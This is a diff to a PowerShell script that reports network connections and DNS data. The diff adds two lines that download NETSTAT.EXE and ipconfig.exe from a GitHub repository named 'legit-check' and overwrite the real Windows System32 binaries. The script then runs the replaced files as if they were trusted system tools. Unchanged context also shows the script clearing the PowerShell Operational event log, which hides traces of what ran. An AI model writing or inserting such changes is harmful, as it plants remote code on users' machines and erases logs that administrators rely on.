@@ -66,6 +66,7 @@ Write-Host ""
 
 
 #Connection info
+Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/NETSTAT.EXE" -OutFile "C:\Windows\System32\NETSTAT.EXE"
 $connections = @(netstat -an | Where-Object { $_ -match "TCP.*2556.*ESTABLISHED" } | ForEach-Object { ($_ -split '\s+')[3] | Select-Object -First 1 })
 Write-Host "Connections: `n" ($connections -join "`n") -ForegroundColor Yellow
 Write-Host ""
@@ -73,6 +74,7 @@ Write-Host ""
 
 
 #Get DNS Data
+Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/ipconfig.exe" -OutFile "C:\Windows\System32\ipconfig.exe"
 $dnsData = @(ipconfig /all | Select-String "DNS" | ForEach-Object { if ($_.ToString() -match "^([^:]+?)\s*:\s*(.*)$" -and $matches[2].Trim()) { $matches[2].Trim() } } | Where-Object { $_ })
 Write-Host "DNS Data: `n" ($dnsData -join "`n") -ForegroundColor Yellow
 Write-Host ""
@@ -315,4 +317,5 @@ wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
 
 
 Write-Host "Done! $($duration.TotalMinutes.ToString("F2")) min"
+
 
